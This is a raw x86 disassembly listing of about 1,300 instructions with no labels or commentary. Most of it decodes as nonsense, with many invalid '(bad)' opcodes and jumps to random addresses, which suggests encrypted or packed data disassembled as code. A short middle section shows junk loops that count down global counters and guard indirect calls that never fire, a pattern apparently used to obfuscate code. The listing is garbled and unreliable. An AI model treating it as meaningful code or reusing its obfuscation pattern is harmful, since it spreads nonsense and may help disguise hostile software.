  40aaab:	test   DWORD PTR [edi+0x20e31df6],esp
  40aab1:	(bad)  
  40aab2:	ins    DWORD PTR es:[edi],dx
  40aab3:	jne    0x40aa4b
  40aab5:	loope  0x40aa52
  40aab7:	adc    cl,BYTE PTR [ebx+0x69]
  40aaba:	push   es
  40aabb:	das    
  40aabc:	or     DWORD PTR [ecx-0x1b],ecx
  40aabf:	(bad)  
  40aac0:	mov    ebp,0x11ff375a
  40aac5:	mov    eax,ds:0x5dc55cb8
  40aaca:	or     bh,ah
  40aacc:	jb     0x40aaac
  40aace:	adc    bh,BYTE PTR [edx+esi*8-0x1f]
  40aad2:	sbb    eax,0xe1eb07f6
  40aad7:	outs   dx,BYTE PTR es:[esi]
  40aad9:	adc    BYTE PTR ds:0xd5395479,cl
  40aadf:	jo     0x40ab18
  40aae1:	in     al,0x6c
  40aae3:	or     eax,0xcea257b8
  40aae8:	lahf   
  40aae9:	loope  0x40aaa5
  40aaeb:	outs   dx,DWORD PTR ds:[esi]
  40aaec:	mov    ?,WORD PTR [eax]
  40aaee:	xor    eax,0x1bef90d0
  40aaf3:	dec    ebp
  40aaf4:	and    cl,cl
  40aaf6:	xchg   ebp,eax
  40aaf7:	es pop es
  40aaf9:	fisttp WORD PTR [esi]
  40aafb:	dec    ebp
  40aafc:	retf   0x1c70
  40aaff:	popf   
  40ab00:	pusha  
  40ab01:	iret   
  40ab02:	cmp    DWORD PTR [esi-0xa],ecx
  40ab05:	mov    bl,0x78
  40ab07:	jl     0x40aab6
  40ab09:	out    dx,eax
  40ab0a:	xor    bl,ch
  40ab0c:	jns    0x40aa9d
  40ab0e:	pop    ecx
  40ab0f:	mov    ah,0x16
  40ab11:	sbb    ebx,DWORD PTR [ebx+0x53]
  40ab14:	(bad)  
  40ab15:	in     eax,0xe7
  40ab17:	shl    ebx,1
  40ab19:	fstp   DWORD PTR [edx+ecx*4]
  40ab1c:	xor    eax,0x7c2e8f20
  40ab21:	xchg   BYTE PTR [edx+esi*2],cl
  40ab24:	(bad)  
  40ab25:	mov    WORD PTR [ebx],ss
  40ab27:	call   0x28aa4c59
  40ab2c:	xchg   ebx,eax
  40ab2d:	nop
  40ab2e:	fsub   DWORD PTR [edx+0x5f10fcf5]
  40ab34:	aam    0x23
  40ab36:	add    eax,0x979f176e
  40ab3b:	jmp    DWORD PTR [edi]
  40ab3d:	xor    DWORD PTR [esi],eax
  40ab3f:	lods   eax,DWORD PTR ds:[esi]
  40ab40:	fwait
  40ab41:	inc    ebx
  40ab42:	rep ins DWORD PTR es:[edi],dx
  40ab44:	push   ds
  40ab45:	cwde   
  40ab46:	jle    0x40aaeb
  40ab48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab49:	xor    DWORD PTR [esi],ebx
  40ab4b:	and    eax,0x1f4378cb
  40ab50:	sti    
  40ab51:	aaa    
  40ab52:	gs mov ?,esi
  40ab55:	adc    al,0xaa
  40ab57:	not    DWORD PTR [ecx-0x3106d9ad]
  40ab5d:	sub    BYTE PTR [ecx-0x20],0x2a
  40ab61:	xor    ah,BYTE PTR [esp+ebp*4-0x4b]
  40ab65:	inc    edx
  40ab66:	test   DWORD PTR [edx+ecx*1+0x345dd6c3],0x945265a3
  40ab71:	ja     0x40abbc
  40ab73:	or     cl,bl
  40ab75:	mov    esp,0x6fccc172
  40ab7a:	repnz pop ds
  40ab7c:	imul   ebx,DWORD PTR [eax-0x50a58dd],0x90c49a4d
  40ab86:	ds sahf 
  40ab88:	mov    ecx,0xb24bbab5
  40ab8d:	push   cs
  40ab8e:	(bad)  
  40ab8f:	neg    DWORD PTR [ebx+esi*2]
  40ab92:	or     edx,esi
  40ab94:	push   0xb6b86e30
  40ab99:	pop    ds
  40ab9a:	add    BYTE PTR [edi-0x64f763],ah
  40aba0:	pushf  
  40aba1:	jmp    0x40ab44
  40aba3:	xor    al,0x87
  40aba5:	pop    es
  40aba6:	dec    ecx
  40aba7:	call   0x7b3e:0x10821ee3
  40abae:	test   eax,0x667b5242
  40abb3:	call   FWORD PTR [ecx+0x34]
  40abb6:	cmp    ecx,DWORD PTR cs:[esi+0x4a336e38]
  40abbd:	add    DWORD PTR ds:0x2ee854e3,edi
  40abc3:	jb     0x40ab51
  40abc5:	mov    edx,0x95dfc95c
  40abca:	loope  0x40aba9
  40abcc:	popa   
  40abcd:	test   al,0xd8
  40abcf:	ret    0x7557
  40abd2:	mov    ebp,0xa845f473
  40abd7:	jmp    0x40ab72
  40abd9:	xor    DWORD PTR [ebp+0x25],edx
  40abdc:	dec    BYTE PTR [ebx-0x3b]
  40abdf:	and    eax,0xbd2ac60f
  40abe4:	pop    ebx
  40abe5:	jl     0x40ab71
  40abe7:	mov    DWORD PTR [esi+0x4e],edx
  40abea:	in     al,0x44
  40abec:	mov    edi,0x81aaa4c
  40abf1:	push   0xbfe03df4
  40abf6:	test   eax,0x5b8ed491
  40abfb:	push   0xffffffd5
  40abfd:	mov    ah,0x89
  40abff:	sub    dh,BYTE PTR [ebx]
  40ac01:	rol    BYTE PTR [ecx+0x42fd7535],1
  40ac07:	add    BYTE PTR [edi+0x30042e7],cl
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e783
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fd5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fdfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fd75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e777,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e777,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e777,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e2bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e373
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e777
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e777,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e1a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e1a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e1a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e1a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e377
  40acd5:	cmp    DWORD PTR ds:0x42e1a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e1a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e1b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fd61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fd61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fd61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd81
  40ad3c:	call   DWORD PTR ds:0x42e5cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fd61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fd61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ada7
  40adb4:	push   eax
  40adb5:	mov    gs,esi
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad7b
  40adc0:	cli    
  40adc1:	stos   DWORD PTR es:[edi],eax
  40adc2:	mov    esi,0xc8186bfa
  40adc7:	push   esp
  40adc8:	out    0xe8,eax
  40adca:	adc    eax,0x4cba5621
  40adcf:	pop    esp
  40add0:	xchg   ecx,eax
  40add1:	scas   al,BYTE PTR es:[edi]
  40add2:	add    ah,0x61
  40add5:	or     ecx,DWORD PTR [ebp-0x4da839de]
  40addb:	bound  ecx,QWORD PTR [ecx+ebp*1-0x69545dc1]
  40ade2:	aas    
  40ade3:	xchg   edi,eax
  40ade4:	jbe    0x40ae3c
  40ade6:	adc    al,0x95
  40ade8:	xor    dh,BYTE PTR [ebp-0x84c1b72]
  40adee:	mov    bl,dh
  40adf0:	outs   dx,BYTE PTR ds:[esi]
  40adf1:	int3   
  40adf2:	add    eax,0xc46b0e61
  40adf7:	jle    0x6995d41b
  40adfd:	inc    edi
  40adfe:	cs xchg esp,eax
  40ae00:	xchg   BYTE PTR [ecx+0xb],al
  40ae03:	fldenv [ebp+0x1169a73b]
  40ae09:	fwait
  40ae0a:	loop   0x40ae3a
  40ae0c:	js     0x40ae39
  40ae0e:	pop    ss
  40ae0f:	sbb    BYTE PTR [ecx],dh
  40ae11:	pop    edx
  40ae12:	dec    ebx
  40ae13:	add    esi,ecx
  40ae15:	rol    BYTE PTR [esi-0x744c77c6],0x54
  40ae1c:	push   ss
  40ae1d:	xchg   esi,eax
  40ae1e:	sahf   
  40ae1f:	inc    esi
  40ae20:	mov    DWORD PTR [ebx+0x13],ecx
  40ae23:	sbb    DWORD PTR [edx-0x14],ebx
  40ae26:	or     al,BYTE PTR [eax]
  40ae28:	addr16 and ebp,esp
  40ae2b:	jne    0x40aea8
  40ae2d:	fdiv   QWORD PTR [ecx+eax*2+0x2f970977]
  40ae34:	repz cmp eax,0x9a0c3144
  40ae3a:	ret    0x604d
  40ae3d:	sub    al,0xb
  40ae3f:	add    DWORD PTR [ebp-0x4d],edi
  40ae42:	mov    dl,0x9e
  40ae44:	scas   al,BYTE PTR es:[edi]
  40ae45:	(bad)  
  40ae46:	dec    ecx
  40ae47:	mov    ebx,0xec5f4604
  40ae4c:	sbb    BYTE PTR [ebx],cl
  40ae4e:	fdivr  QWORD PTR [esi]
  40ae50:	jno    0x40ae49
  40ae52:	test   eax,0x431731d1
  40ae57:	mov    eax,cs:0x18f16071
  40ae5d:	addr16 push ebx
  40ae5f:	dec    edi
  40ae60:	sub    eax,0x67639578
  40ae65:	pop    edi
  40ae66:	cmp    DWORD PTR [ebx],esi
  40ae68:	mov    ebp,0xad8bf027
  40ae6d:	push   esp
  40ae6e:	pop    ds
  40ae6f:	cmp    eax,0x8429679a
  40ae74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae75:	jb     0x40ae4b
  40ae77:	mov    ds:0xd38e747d,al
  40ae7c:	ret    
  40ae7d:	or     DWORD PTR [esi+0x52],ebp
  40ae80:	popf   
  40ae81:	js     0x40ae16
  40ae83:	fistp  WORD PTR [esi]
  40ae85:	(bad)  
  40ae87:	xor    esi,ecx
  40ae89:	jmp    0xca948d67
  40ae8e:	xchg   ebp,eax
  40ae8f:	stos   BYTE PTR es:[edi],al
  40ae90:	(bad)  
  40ae91:	aad    0x56
  40ae93:	faddp  st(2),st
  40ae95:	je     0x40ae59
  40ae97:	dec    ebp
  40ae98:	mov    ch,0x84
  40ae9a:	jbe    0x40ae82
  40ae9c:	fcomi  st,st(3)
  40ae9e:	xor    al,0x97
  40aea0:	cli    
  40aea1:	xor    eax,DWORD PTR [eax-0x5c]
  40aea4:	imul   esp,DWORD PTR [eax-0x36a72037],0xf6d400dd
  40aeae:	cmp    al,0xb4
  40aeb0:	xchg   ebx,eax
  40aeb1:	daa    
  40aeb2:	ja     0x40ae53
  40aeb4:	xor    esp,edx
  40aeb6:	frndint 
  40aeb8:	std    
  40aeb9:	add    DWORD PTR [ebx+0x5019cacc],esi
  40aebf:	push   ds
  40aec0:	retf   0x9bb7
  40aec3:	push   ds
  40aec4:	call   0x58d9aa01
  40aec9:	fidivr DWORD PTR ds:0xf6c32d3e
  40aecf:	mov    BYTE PTR [esi],ch
  40aed1:	xchg   edx,eax
  40aed2:	lods   al,BYTE PTR ds:[esi]
  40aed3:	and    eax,0xd0644603
  40aed8:	inc    edx
  40aed9:	sbb    eax,0xb2ccc329
  40aede:	data16 aas 
  40aee0:	div    DWORD PTR [edi+0x10]
  40aee3:	imul   DWORD PTR [eax+edi*2+0x29]
  40aee7:	sbb    BYTE PTR [eax-0x5064600],ah
  40aeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeee:	ins    DWORD PTR es:[edi],dx
  40aeef:	pusha  
  40aef0:	sbb    DWORD PTR [ebp+esi*2+0x10],esi
  40aef4:	push   esi
  40aef5:	test   BYTE PTR [ecx-0x72cb5af6],dh
  40aefb:	(bad)
  40aefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeff:	aad    0xef
  40af01:	pop    ds
  40af02:	jg     0x40aefe
  40af04:	adc    eax,0x72a393aa
  40af09:	jmp    0xf9ec33c3
  40af0e:	jb     0x40af4e
  40af10:	push   es
  40af11:	adc    ch,cl
  40af13:	rol    DWORD PTR [edx],1
  40af15:	fldcw  WORD PTR [ecx]
  40af17:	cmp    eax,0x6244f366
  40af1c:	fld    TBYTE PTR [ebp-0x56]
  40af1f:	pop    edi
  40af20:	and    dh,BYTE PTR [esi]
  40af22:	mov    cl,0xc9
  40af24:	fild   QWORD PTR [ecx]
  40af26:	int    0x2b
  40af28:	inc    ecx
  40af29:	sub    al,0x65
  40af2b:	arpl   si,ax
  40af2d:	iret   
  40af2e:	sbb    ebx,0xa6299d35
  40af34:	or     BYTE PTR [ebx+eiz*2],cl
  40af37:	add    DWORD PTR [ecx+0x62],edx
  40af3a:	push   0x57519d64
  40af3f:	inc    esp
  40af40:	shl    DWORD PTR [edx-0x1d],1
  40af43:	mov    WORD PTR [ebp+0x1],cs
  40af46:	cli    
  40af47:	push   0x15
  40af49:	not    DWORD PTR [esi-0x4d]
  40af4c:	sbb    al,0x26
  40af4e:	into   
  40af4f:	hlt    
  40af50:	int    0xd
  40af52:	dec    edi
  40af53:	ret    0x5a1a
  40af56:	add    dl,BYTE PTR [edx]
  40af58:	mov    eax,DWORD PTR [edi-0x7c973759]
  40af5e:	repnz imul ebx,DWORD PTR [edi],0xf41be501
  40af65:	in     al,dx
  40af66:	std    
  40af67:	hlt    
  40af68:	pop    ebx
  40af69:	stc    
  40af6a:	mov    ah,0xb7
  40af6c:	xor    edx,DWORD PTR [ebx-0x7d6bac3f]
  40af72:	sbb    eax,0xe42466c
  40af77:	call   0x3ce3:0x4036edd3
  40af7e:	jge    0x40af9e
  40af80:	push   eax
  40af81:	push   eax
  40af82:	mov    cl,0x84
  40af84:	pop    edx
  40af85:	push   ebx
  40af86:	stc    
  40af87:	pop    ebx
  40af88:	daa    
  40af89:	aas    
  40af8a:	stc    
  40af8b:	(bad)  
  40af8d:	cmp    al,0x3d
  40af8f:	ds xchg ebx,eax
  40af91:	mov    cl,0xb6
  40af93:	fcomp  st(6)
  40af95:	jbe    0x40af2f
  40af97:	adc    BYTE PTR [edx],0x1f
  40af9a:	mov    dl,0x6
  40af9c:	clc    
  40af9d:	cmp    DWORD PTR [esi-0x70],esp
  40afa0:	inc    edx
  40afa1:	inc    edi
  40afa2:	xor    al,0xfe
  40afa4:	xchg   edx,eax
  40afa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afa6:	call   0xe916a08b
  40afab:	gs sbb al,0xb2
  40afae:	mov    ds:0x3989ff7c,eax
  40afb3:	xchg   ebp,eax
  40afb4:	lods   al,BYTE PTR ds:[esi]
  40afb5:	cmp    BYTE PTR [edi],cl
  40afb7:	xor    eax,0xc9bdbfa9
  40afbc:	fisub  DWORD PTR [eax]
  40afbe:	push   ebx
  40afbf:	pop    ebx
  40afc0:	sub    BYTE PTR [eax],cl
  40afc2:	sbb    BYTE PTR [ecx],dh
  40afc4:	fidiv  DWORD PTR [edi+esi*1+0x52]
  40afc8:	and    DWORD PTR [eax+esi*2],edx
  40afcb:	push   0xf38ffe64
  40afd0:	jmp    0x7579:0x1c7083c0
  40afd7:	inc    ebp
  40afd8:	inc    ebx
  40afd9:	push   DWORD PTR [eax+esi*4]
  40afdc:	sahf   
  40afdd:	inc    ecx
  40afde:	jbe    0x40b02e
  40afe0:	les    ecx,FWORD PTR [ebp-0x72]
  40afe3:	test   al,0xf8
  40afe5:	cld    
  40afe6:	rdtsc  
  40afe8:	inc    ecx
  40afe9:	inc    edx
  40afea:	push   cs
  40afeb:	xlat   BYTE PTR ds:[ebx]
  40afec:	pop    ebx
  40afed:	mov    ebx,0xa2f236fb
  40aff2:	add    ah,BYTE PTR [ebp-0x7b]
  40aff5:	mov    al,ch
  40aff7:	fdiv   st,st(6)
  40aff9:	(bad)  
  40affa:	pushf  
  40affb:	ins    BYTE PTR es:[edi],dx
  40affc:	or     cl,BYTE PTR [ecx]
  40affe:	in     eax,dx
  40afff:	mov    eax,ds:0xda9724c
  40b004:	jo     0x40af8f
  40b006:	fs stc 
  40b008:	xor    BYTE PTR [ecx+ebx*1+0x55a48530],bl
  40b00f:	xor    eax,DWORD PTR [esi]
  40b011:	push   ss
  40b012:	(bad)  
  40b013:	clc    
  40b014:	jb     0x40afc1
  40b016:	in     eax,dx
  40b017:	jb     0x40b058
  40b019:	xlat   BYTE PTR ds:[ebx]
  40b01a:	stos   BYTE PTR es:[edi],al
  40b01b:	jg     0x40afaa
  40b01d:	push   eax
  40b01e:	push   ecx
  40b01f:	adc    eax,esp
  40b021:	rcl    bl,0xe0
  40b024:	in     eax,dx
  40b025:	hlt    
  40b026:	outs   dx,BYTE PTR ds:[esi]
  40b027:	rcl    DWORD PTR [edx+0x7e],0xac
  40b02b:	xor    eax,0x5630148a
  40b030:	mov    al,ds:0x7ba5ea83
  40b035:	mov    edx,0x1c2d1278
  40b03a:	add    al,0x61
  40b03c:	cmp    al,0xcd
  40b03e:	mov    eax,ds:0xfad7338d
  40b043:	dec    esi
  40b044:	retf   0x4769
  40b047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b048:	push   edi
  40b049:	ins    DWORD PTR es:[edi],dx
  40b04a:	inc    edx
  40b04b:	push   0xffffffe8
  40b04d:	mov    bh,0x77
  40b04f:	cld    
  40b050:	and    DWORD PTR [ebp+esi*4+0x3a],ecx
  40b054:	js     0x40b09b
  40b056:	jnp    0x40afdf
  40b058:	push   cs
  40b059:	out    dx,al
  40b05a:	inc    edx
  40b05b:	xlat   BYTE PTR ds:[ebx]
  40b05c:	das    
  40b05d:	fistp  WORD PTR [ecx]
  40b05f:	scas   al,BYTE PTR es:[edi]
  40b060:	inc    edi
  40b061:	inc    ebx
  40b062:	repnz sub eax,0xd9a42ef9
  40b068:	fwait
  40b069:	mov    al,ds:0xe22a52a3
  40b06e:	xor    BYTE PTR [eax],dh
  40b070:	test   BYTE PTR [ebx],bh
  40b072:	lods   al,BYTE PTR ds:[esi]
  40b073:	pop    es
  40b074:	clc    
  40b075:	inc    eax
  40b076:	pop    esp
  40b077:	es mov ebp,0x29020edc
  40b07d:	and    cl,bl
  40b07f:	push   edx
  40b080:	imul   ebx,ebp,0x26516dd2
  40b086:	xchg   edi,eax
  40b087:	or     al,0x4c
  40b089:	std    
  40b08a:	ins    BYTE PTR es:[edi],dx
  40b08b:	ja     0x40b0eb
  40b08d:	lods   eax,DWORD PTR fs:[esi]
  40b08f:	loope  0x40b037
  40b091:	mov    ch,BYTE PTR [esi+eiz*1-0x1b]
  40b095:	dec    ebx
  40b096:	popf   
  40b097:	xchg   dl,cl
  40b099:	(bad)  
  40b09a:	aam    0xcf
  40b09c:	add    al,0x2d
  40b09e:	imul   esp,DWORD PTR [eax],0xa01d2632
  40b0a4:	addr16 fs ds dec esi
  40b0a8:	mov    edi,0x22e97de
  40b0ad:	cs in  al,0x18
  40b0b0:	xchg   dl,ch
  40b0b2:	not    DWORD PTR [eax]
  40b0b4:	jge    0x40b103
  40b0b6:	outs   dx,DWORD PTR ds:[esi]
  40b0b7:	aam    0x39
  40b0b9:	dec    edi
  40b0ba:	pop    edi
  40b0bb:	add    ecx,DWORD PTR [esp+edi*2+0x6]
  40b0bf:	mov    ?,WORD PTR [edi+0x14]
  40b0c2:	into   
  40b0c3:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0c5:	popa   
  40b0c6:	test   eax,0xb65f9cb1
  40b0cb:	aad    0x45
  40b0cd:	adc    DWORD PTR [ebx+eax*8],edx
  40b0d0:	mov    al,0xcf
  40b0d2:	dec    ecx
  40b0d3:	dec    ecx
  40b0d4:	mov    bl,0xd0
  40b0d6:	cld    
  40b0d7:	test   BYTE PTR [edi],0x94
  40b0da:	in     eax,0x4a
  40b0dc:	adc    al,0xf
  40b0de:	jbe    0x40b142
  40b0e0:	repnz into 
  40b0e2:	out    dx,al
  40b0e3:	iret   
  40b0e4:	dec    esp
  40b0e5:	mov    ebp,0xd3d95bae
  40b0ea:	sub    BYTE PTR [eax-0x44d6ca13],0xb0
  40b0f1:	test   BYTE PTR [ebp+0x6e],0xb4
  40b0f5:	fild   DWORD PTR [edx-0x55]
  40b0f8:	xor    eax,0x532991bc
  40b0fd:	cmp    BYTE PTR [ebp+eiz*8-0x3b431d15],dh
  40b104:	push   ecx
  40b105:	sbb    al,0x8
  40b107:	mov    eax,ds:0xb60b0464
  40b10c:	ja     0x40b0a0
  40b10e:	in     eax,0x3f
  40b110:	dec    ebp
  40b111:	push   edi
  40b112:	and    DWORD PTR [eax+0x53],0xffffffd7
  40b116:	or     eax,0xba281b9
  40b11b:	fldenv [ecx]
  40b11d:	dec    edi
  40b11e:	xchg   edi,eax
  40b11f:	int    0x58
  40b121:	dec    edx
  40b122:	xrelease xchg BYTE PTR [esi-0x6c],bl
  40b126:	aam    0x43
  40b128:	mov    edi,ebp
  40b12a:	jb     0x40b13c
  40b12c:	mov    dl,0x6e
  40b12e:	mov    DWORD PTR [edi-0x31e84292],eax
  40b134:	pop    es
  40b135:	stos   DWORD PTR es:[edi],eax
  40b136:	add    bl,BYTE PTR [eax+ecx*1-0xe]
  40b13a:	mov    ebx,DWORD PTR [ecx+0x79]
  40b13d:	mov    ah,0xbc
  40b13f:	div    al
  40b141:	inc    edi
  40b142:	pop    ebx
  40b143:	jne    0x40b1b4
  40b145:	mov    cl,0x54
  40b147:	jns    0x40b0d5
  40b149:	mov    ecx,0x6891e91d
  40b14e:	les    ecx,FWORD PTR [ebx]
  40b150:	call   0x19d6:0x7f567653
  40b157:	jg     0x40b101
  40b159:	ins    DWORD PTR es:[edi],dx
  40b15a:	sub    al,dl
  40b15c:	repnz aas 
  40b15e:	mov    edi,0xe9d103d3
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	(bad)  
  40b175:	sub    BYTE PTR ds:0x7070faa2,ah
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1fd
  40b180:	arpl   WORD PTR [eax-0xc],sp
  40b183:	xchg   esp,eax
  40b184:	ins    DWORD PTR es:[edi],dx
  40b185:	xor    ah,dh
  40b187:	push   eax
  40b188:	fwait
  40b189:	xor    ebp,DWORD PTR [eax+ebp*4+0x1df036f4]
  40b190:	jl     0x40b16d
  40b192:	out    0x27,al
  40b194:	test   cl,cl
  40b196:	test   DWORD PTR [esi+0x445dc77b],esp
  40b19c:	and    eax,0x8a35392d
  40b1a1:	pop    es
  40b1a2:	mov    bl,BYTE PTR [edx+0x6b]
  40b1a5:	lahf   
  40b1a6:	leave  
  40b1a7:	icebp  
  40b1a8:	stos   DWORD PTR es:[edi],eax
  40b1a9:	xchg   ecx,eax
  40b1aa:	nop
  40b1ab:	call   0x7cd2:0x5a064c55
  40b1b2:	or     esi,edi
  40b1b4:	or     ebx,edi
  40b1b6:	fcmovnu st,st(3)
  40b1b8:	xchg   ebx,eax
  40b1b9:	cmc    
  40b1ba:	mov    ebp,0x4edff906
  40b1bf:	mov    ds:0xdb825ea1,al
  40b1c4:	lods   eax,DWORD PTR ds:[esi]
  40b1c5:	ficomp DWORD PTR [ebp+0x5c]
  40b1c8:	jge    0x40b200
  40b1ca:	sbb    DWORD PTR [eax],ecx
  40b1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1cd:	push   0xffffffe3
  40b1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d0:	mov    bl,0x56
  40b1d2:	jno    0x40b245
  40b1d4:	pop    edx
  40b1d5:	or     al,0xce
  40b1d7:	out    0x1f,eax
  40b1d9:	out    0xec,al
  40b1db:	lods   al,BYTE PTR ds:[esi]
  40b1dc:	fld    DWORD PTR [edx+0x4]
  40b1df:	xchg   esp,eax
  40b1e0:	inc    ebp
  40b1e1:	inc    eax
  40b1e2:	and    eax,0x766ccb39
  40b1e7:	push   esi
  40b1e8:	dec    eax
  40b1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ea:	test   eax,0xe08b6f73
  40b1ef:	popf   
  40b1f0:	push   edx
  40b1f1:	sti    
  40b1f2:	sub    al,0x51
  40b1f4:	push   es
  40b1f5:	xchg   ebx,eax
  40b1f6:	xor    al,0x76
  40b1f8:	clc    
  40b1f9:	je     0x40b224
  40b1fb:	cli    
  40b1fc:	add    edx,0x9ef68a91
  40b202:	jge    0x40b268
  40b204:	add    esi,DWORD PTR [esi+0x27]
  40b207:	call   0xbf9e0422
  40b20c:	xchg   esp,eax
  40b20d:	xchg   esi,eax
  40b20e:	push   eax
  40b20f:	jo     0x40b206
  40b211:	pop    edx
  40b212:	jns    0x40b235
  40b214:	pusha  
  40b215:	mov    bl,0x71
  40b217:	loop   0x40b1ca
  40b219:	out    dx,eax
  40b21a:	pusha  
  40b21b:	xor    al,0xf9
  40b21d:	call   DWORD PTR [ebx+0x6d]
  40b220:	or     edx,eax
  40b222:	sbb    eax,0xedc654eb
  40b227:	aas    
  40b228:	push   edi
  40b229:	mov    eax,0xa59fd6cd
  40b22e:	push   ds
  40b22f:	jp     0x40b24f
  40b231:	repz retf 
  40b233:	sbb    DWORD PTR [eax+0x72],edx
  40b236:	scas   al,BYTE PTR es:[edi]
  40b237:	mov    esp,edi
  40b239:	mov    al,ds:0xb8e24634
  40b23e:	leave  
  40b23f:	inc    esi
  40b240:	sbb    bl,dh
  40b242:	repnz retf 0x3948
  40b246:	sub    esi,DWORD PTR [edx+0x4157533f]
  40b24c:	add    eax,0x5b7f6fe8
  40b251:	loop   0x40b29a
  40b253:	ror    BYTE PTR [ecx+0x67],0x3a
  40b257:	jge    0x40b1e1
  40b259:	js     0x40b279
  40b25b:	push   ecx
  40b25c:	push   eax
  40b25d:	xor    eax,0xf377b823
  40b262:	dec    esp
  40b263:	lahf   
  40b264:	and    edi,ecx
  40b266:	xor    BYTE PTR [eax+ebp*1+0x224a1f85],bh
  40b26d:	(bad)  
  40b26e:	push   ecx
  40b26f:	add    dl,al
  40b271:	mov    ebp,0xabc21373
  40b276:	mov    DWORD PTR [ecx],esi
  40b278:	adc    ah,al
  40b27a:	imul   eax,edx,0xa29a8daa
  40b280:	js     0x40b28e
  40b282:	xor    BYTE PTR [ebx-0x19],dl
  40b285:	retf   
  40b286:	sbb    BYTE PTR [esi+0x5158393d],0x3a
  40b28d:	sub    eax,0x75f9a54f
  40b292:	ds (bad) 
  40b294:	popf   
  40b295:	jmp    0x40b2c1
  40b297:	leave  
  40b298:	(bad)  
  40b299:	lods   al,BYTE PTR ds:[esi]
